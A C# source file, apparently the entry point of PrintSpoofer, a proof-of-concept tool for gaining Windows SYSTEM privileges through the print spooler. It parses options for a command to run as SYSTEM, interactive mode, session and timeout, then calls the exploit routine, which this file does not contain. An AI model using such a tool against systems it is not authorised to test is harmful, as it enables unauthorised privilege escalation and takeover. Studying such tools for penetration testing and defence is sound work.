using PrintSpoofer.Handler;
using PrintSpoofer.Interop;
using PrintSpoofer.Library;
using RpcLibrary;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace PrintSpoofer
{
    using RPC_STATUS = Int32;

    internal class PrintSpoofer
    {
        static void Main(string[] args)
        {
            if (!Environment.Is64BitProcess)
            {
                Console.WriteLine("\n[-] This program does not support 32bit mode.\n");
                return;
            }

            var options = new CommandLineParser();

            try
            {
                options.SetTitle("PrintSpoofer - PoC to get SYSTEM privileges with print spooler method.");
                options.AddFlag(false, "h", "help", "Displays this help message.");
                options.AddFlag(false, "i", "interactive", "Flag to execute command with interactive mode.");
                options.AddParameter(true, "c", "command", null, "Specifies command to execute.");
                options.AddParameter(false, "s", "session", null, "Specifies session ID.");
                options.AddParameter(false, "t", "timeout", "3000", "Specifies timeout in milliseconds. Default is 3,000 ms.");
                options.Parse(args);

                Execute.Run(options);
            }
            catch (InvalidOperationException ex)
            {
                Console.WriteLine(ex.Message);
            }
            catch (ArgumentException ex)
            {
                options.GetHelp();
                Console.WriteLine(ex.Message);
            }
        }
    }
}
